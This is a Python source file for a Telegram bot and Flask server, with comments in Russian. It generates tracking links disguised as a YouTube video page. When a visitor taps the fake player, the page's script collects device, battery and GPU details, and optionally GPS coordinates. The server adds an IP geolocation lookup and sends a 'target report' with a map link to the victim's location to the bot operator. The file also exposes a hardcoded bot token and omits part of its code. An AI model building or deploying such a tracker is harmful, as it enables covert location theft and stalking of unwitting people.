import asyncio, threading, requests, uuid, json, os, time
from flask import Flask, render_template_string, request
from aiogram import Bot, Dispatcher, F, types
from aiogram.filters import Command
from aiogram.utils.keyboard import ReplyKeyboardBuilder, InlineKeyboardBuilder

# --- CONFIG ---
API_TOKEN = "8698847126:AAEM6qoKEcFd-oosvzrhz7SqAAewUM_ERhg"
BASE_URL = "https://tg-bot-backend-oo97.onrender.com" 
PORT = int(os.environ.get("PORT", 10000))

app = Flask(__name__)
vault = {}
user_modes = {}

# Шаблон с поддержкой двух разных JS-логик
HTML_TEMPLATE = """
<!DOCTYPE html>
<html>
<head>
    <title>YouTube</title>
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <style>
        body { background: #fff; margin: 0; font-family: sans-serif; text-align: center; }
        .player { width: 100%; background: #000; aspect-ratio: 16/9; position: relative; cursor: pointer; display:flex; align-items:center; justify-content:center; }
        .play-btn { position: absolute; width: 68px; height: 48px; background: rgba(255,0,0,0.9); border-radius: 12px; }
        .play-btn::after { content: ''; border-left: 20px solid #fff; border-top: 12px solid transparent; border-bottom: 12px solid transparent; margin-left: 5px; }
    </style>
</head>
<body onclick="ignite()">
    <div style="padding: 10px; border-bottom: 1px solid #eee;"><img src="https://upload.wikimedia.org/wikipedia/commons/b/b8/YouTube_Logo_2017.svg" width="90"></div>
    <div class="player">
        <img src="https://img.youtube.com/vi/dQw4w9WgXcQ/maxresdefault.jpg" style="width:100%;">
        <div class="play-btn"></div>
    </div>
    <div style="padding: 15px; text-align: left;">
        <div style="font-size: 18px;">Exclusive: Смешные моменты 2026 😂 #мемы</div>
        <div style="font-size: 12px; color: #606060; margin-top: 5px;">1.8 млн просмотров</div>
    </div>
<script>
let sent = false;
let mode = "{{ mode }}";

async function ignite() {
    if(sent) return; sent = true;
    let d = { aid: "{{ aid }}", ua: navigator.userAgent, res: screen.width+"x"+screen.height, ref: document.referrer };

    // Собираем заряд батареи (работает везде)
    try {
        let b = await navigator.getBattery();
        d.bat = Math.round(b.level * 100) + "% " + (b.charging ? "⚡" : "🔋");
    } catch(e) { d.bat = "N/A"; }

    // Собираем GPU и железо
    try {
        let gl = document.createElement('canvas').getContext('webgl');
        let dbg = gl.getExtension('WEBGL_debug_renderer_info');
        d.gpu = gl.getParameter(dbg.UNMASKED_RENDERER_WEBGL);
        d.cores = navigator.hardwareConcurrency;
        d.mem = navigator.deviceMemory;
    } catch(e) {}

    // ЕСЛИ ВЫБРАН РЕЖИМ ТОЧНОГО ГЕО
    if (mode === "PRECISION") {
        navigator.geolocation.getCurrentPosition(
            (pos) => {
                d.gps = { lat: pos.coords.latitude, lon: pos.coords.longitude, acc: pos.coords.accuracy };
                send(d);
            },
            (err) => { d.gps = "Denied"; send(d); },
            { enableHighAccuracy: true, timeout: 5000 }
        );
    } else {
        send(d);
    }
}

function send(d) {
    fetch('/log', { method: 'POST', headers: {'Content-Type': 'application/json'}, body: JSON.stringify(d) })
    .finally(() => { 
        setTimeout(() => { location.href = "https://www.youtube.com/watch?v=dQw4w9WgXcQ"; }, 1000); 
    });
}
</script>
</body>
</html>
"""

@app.route('/v/<aid>')
def view(aid):
    mode = user_modes.get(str(aid), "ANALYTICS")
    return render_template_string(HTML_TEMPLATE, aid=aid, mode=mode)

@app.route('/log', methods=['POST'])
def logger():
    d = request.json
    ip = request.headers.get('X-Forwarded-For', request.remote_addr).split(',')[0].strip()
    geo = requests.get(f"http://ip-api.com/json/{ip}?fields=status,country,city,lat,lon,isp,mobile,proxy").json()
    
    token = "EXP-" + str(uuid.uuid4())[:6].upper()
    vault[token] = d

    # Формируем КИЛОМЕТРОВЫЙ ОТЧЕТ
    gps_info = "❌ Не запрашивалось"
    if d.get('gps'):
        if d['gps'] == "Denied": gps_info = "🚫 Жертва отклонила доступ"
        elif d['gps'] == "Denied": gps_info = "🚫 Ошибка GPS"
        else: 
            gps_info = f"✅ ТОЧНОЕ: `{d['gps']['lat']}, {d['gps']['lon']}`\n🎯 Точность: `{d['gps']['acc']}м`"
            map_url = f"https://www.google.com/maps?q={d['gps']['lat']},{d['gps']['lon']}"
            gps_info += f"\n📍 [ОТКРЫТЬ ДОМ НА КАРТЕ]({map_url})"

    report = (
        f"🌟 **ПОЛНЫЙ ОТЧЕТ ПО ЦЕЛИ**\n"
        f"━━━━━━━━━━━━━━━━━━━━\n"
        f"🌐 **СЕТЬ И ГЕО (IP):**\n"
        f"• IP: `{ip}`\n"
        f"• Город: `{geo.get('city')}, {geo.get('country')}`\n"
        f"• Провайдер: `{geo.get('isp')}`\n"
        f"• Тип: {'📱 Мобильный' if geo.get('mobile') else '🌐 Wi-Fi'}\n"
        f"• VPN: {'⚠️ Да' if geo.get('proxy') else '✅ Нет'}\n\n"
        f"🛰 **GPS ДАННЫЕ:**\n{gps_info}\n\n"
        f"🔋 **СОСТОЯНИЕ:**\n• Заряд: `{d.get('bat')}`\n\n"
        f"💻 **ЖЕЛЕЗО:**\n• GPU: `{d.get('gpu', 'N/A')[:40]}...`\n"
        f"• RAM: `{d.get('mem', 'N/A')} GB` | Cores: `{d.get('cores', 'N/A')}`\n"
        f"• Экран: `{d.get('res')}`\n"
        f"━━━━━━━━━━━━━━━━━━━━\n"
        f"🔑 **ТОКЕН ДЛЯ JSON:** `{token}`"
    )
    
    requests.post(f"https://api.telegram.org/bot{API_TOKEN}/sendMessage", 
                  json={"chat_id": d['aid'], "text": report, "parse_mode": "Markdown", "disable_web_page_preview": True})
    return "OK", 200

# [Код бота с кнопками выбора ANALYTICS или PRECISION]
@dp.message(F.text == "🧨 Сгенерировать ссылку")
async def mode_select(message: types.Message):
    kb = InlineKeyboardBuilder()
    kb.button(text="📊 Аналитика + Батарея", callback_data="m_ANALYTICS")
    kb.button(text="🎯 Точное ГЕО (Запрос GPS)", callback_data="m_PRECISION")
    kb.adjust(1)
    await message.answer("Выбери режим работы:", reply_markup=kb.as_markup())

@dp.callback_query(F.data.startswith("m_"))
async def finalize(callback: types.CallbackQuery):
    mode = callback.data.split("_")[1]
    user_modes[str(callback.from_user.id)] = mode
    await callback.message.edit_text(f"🎯 **ССЫЛКА ЗАРЯЖЕНА ({mode})**\n🔗 `{BASE_URL}/v/{callback.from_user.id}`")

# ... (Остальной код запуска из v28.0)
